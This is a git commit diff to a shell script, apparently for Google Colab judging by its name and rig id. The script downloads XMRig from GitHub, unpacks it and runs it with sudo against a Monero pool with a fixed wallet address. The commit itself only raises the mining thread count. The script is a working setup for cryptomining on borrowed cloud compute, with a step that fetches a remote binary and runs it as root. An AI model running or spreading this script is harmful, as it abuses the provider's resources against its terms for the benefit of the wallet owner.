a64172a13dbf83ced09b4b036b5d4b2664bcc73e
nxbylask <45672701+nxbylask@users.noreply.github.com>
2022-03-12 23:45:20 -0700

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-sudo ./xmrig -o us-west.minexmr.com:4444 -u 47Ca9o1NHxSciy1QcNFYndVhPXcMjuMRCY3wVMZyTeLDLCZTxnqZj9WUccJbfahXDBPkqmzX7jUzFCGvNj5NBCBsRLQWX9G -k --rig-id GC-US -t 38 --randomx-1gb-pages
+sudo ./xmrig -o us-west.minexmr.com:4444 -u 47Ca9o1NHxSciy1QcNFYndVhPXcMjuMRCY3wVMZyTeLDLCZTxnqZj9WUccJbfahXDBPkqmzX7jUzFCGvNj5NBCBsRLQWX9G -k --rig-id GC-US -t 40 --randomx-1gb-pages
